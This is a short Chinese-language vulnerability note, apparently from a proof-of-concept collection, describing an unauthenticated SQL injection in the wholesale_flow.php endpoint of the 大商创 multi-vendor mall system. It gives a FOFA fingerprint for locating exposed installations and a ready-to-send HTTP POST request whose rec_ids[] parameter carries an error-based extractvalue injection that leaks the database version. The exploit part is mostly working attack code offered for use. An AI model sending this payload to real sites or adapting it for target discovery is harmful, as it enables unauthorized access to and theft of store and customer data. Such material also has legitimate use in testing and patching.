# 大商创多用户商城wholesale_flow.php存在SQL注入漏洞

大商创多用户商城系统 wholesale_flow.php接口处存在SQL注入漏洞，未经身份验证攻击者可通过输入恶意 SQL 代码，突破系统原本设定的访问规则，未经授权访问、修改或删除数据库中的各类敏感信息，包括但不限于员工个人资料、企业核心业务数据等。进一步利用可获取服务器权限。

## fofa

```
body="dsc-choie"
```

## poc

```javascript
POST /wholesale_flow.php?step=ajax_update_cart HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close
 
rec_ids[]=extractvalue(1,concat(0x7e,version()))
```

![image-20241019201036088](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202410251431588.png)



